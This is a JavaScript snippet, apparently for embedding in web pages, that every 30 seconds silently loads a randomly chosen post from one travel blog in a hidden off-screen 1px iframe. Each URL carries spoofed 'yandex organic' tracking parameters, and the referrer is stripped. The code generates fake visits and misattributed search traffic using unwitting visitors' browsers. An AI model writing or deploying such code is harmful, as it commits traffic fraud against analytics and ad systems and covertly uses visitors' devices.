  const urls = [
    "https://www.grandsphere.online/2023/05/digital-nomad-lifestyle-how-to-work-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/destination-spotlight-exploring-hidden.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/remote-work-revolution-embracing.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/packing-tips-for-nomads-essential-gear.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/finding-perfect-work-life-balance-as.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/nomadic-entrepreneurship-building-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/slow-travel-embracing-journey-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/financial-strategies-for-sustainable.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/health-and-wellness-on-road-self-care.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.grandsphere.online/2023/05/the-nomadic-community-connecting-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
